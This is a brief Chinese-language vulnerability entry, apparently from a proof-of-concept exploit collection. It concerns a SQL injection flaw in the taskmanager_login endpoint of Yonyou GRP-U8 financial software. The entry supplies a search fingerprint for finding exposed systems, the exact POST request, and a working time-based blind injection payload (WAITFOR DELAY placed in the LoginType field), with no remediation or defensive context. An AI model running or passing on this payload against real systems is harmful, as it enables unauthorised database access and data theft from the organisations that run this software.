# 用友GRP-U8系统taskmanager_login存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-GRP-U8"`
- **请求**：`POST /TaskManager/taskmanager_login HTTP/1.1`

**Payload**
```
UserNameText=%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1&UserPassText=abc&LoginType=;WAITFOR DELAY '0:0:5'--&submitAction=login
```
- **响应特征**：200